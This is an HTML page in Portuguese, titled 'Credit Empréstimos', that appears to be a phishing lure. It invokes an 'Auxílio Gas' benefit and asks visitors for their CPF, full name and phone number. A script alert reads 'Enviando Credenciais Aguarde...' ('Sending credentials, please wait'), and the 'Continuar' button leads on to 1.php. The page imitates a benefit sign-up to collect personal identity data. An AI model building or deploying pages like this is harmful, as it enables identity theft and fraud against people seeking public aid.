<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Credit Empréstimos</title>
    <script>
        function kk() {
            alert("Enviando Credenciais Aguarde...");
        }
    </script>
    <style>
        body {
            background-color: #FFD700; /* Amarelo mais escuro */
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .box {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 930px;
            width: 100%;
        }

        .form-box {
            background-color: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(40px);
            padding: 30px 40px;
            width: 60%; /* Aumentando a largura do formulário */
            border-radius: 0 20px 20px 0;
        }

        .img-box {
            width: 40%;
            padding-right: 20px;
        }

        .img-box img {
            width: 100%;
            border-radius: 20px 0 0 20px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            font-weight: bold;
            color: #3D3D3D;
        }

        .input-group input {
            width: 100%;
            height: 47px;
            background-color: rgba(255, 255, 255, 0.32);
            border-radius: 20px;
            padding: 15px;
            font-size: 15px;
            border: 2px solid transparent;
            outline: none;
            transition: all 0.4s ease;
        }

        .input-group input:focus {
            border-color: #FFD700; /* Amarelo mais escuro */
        }

        .botao-comprar {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #FFD700; /* Amarelo escuro */
            color: white; /* Texto branco */
            text-align: center;
            border-radius: 25px; /* Borda arredondada */
            text-decoration: none;
            font-size: 16px;
            font-weight: bold;
            border: none;
        }

        .botao-comprar:hover {
            background-color: #FFD700; /* Amarelo mais escuro no hover */
            color: white;
        }

    </style>
</head>
<body>
    <div class="box">
        <div class="img-box">
            <img src="img-formulario.png">
        </div>
        <div class="form-box">
            <h2>Cadastro</h2>
            <p>Auxílio Gas</p>
            <form class="enviarrg" action="" method="post" enctype="multipart/form-data">
                <div class="input-group">
                    <label for="nome">CPF</label>
                    <input class="cpf" oninput="mascara(this)" type="text" id="nome" placeholder="Digite o seu CPF" name="cpf" required>
                </div>
                <div class="input-group">
                    <label for="email">Nome completo</label>
                    <input class="nome" type="text" id="email" placeholder="Digite o seu Nome" name="nome" required>
                </div>
                <div class="input-group">
                    <label for="telefone">Telefone</label>
                    <input class="telefone" type="tel" id="telefone" placeholder="Digite o seu telefone" name="telefone" required>
                </div>
                <div class="input-group">
                    <a href="1.php" class="botao-comprar">Continuar</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        function mascara(i){
            var v = i.value;
            if(isNaN(v[v.length-1])){ // impede entrar outro caractere que não seja número
                i.value = v.substring(0, v.length-1);
                return;
            }
            i.setAttribute("maxlength", "14");
            if (v.length == 3 || v.length == 7) i.value += ".";
            if (v.length == 11) i.value += "-";
        }
    </script>
</body>
</html>
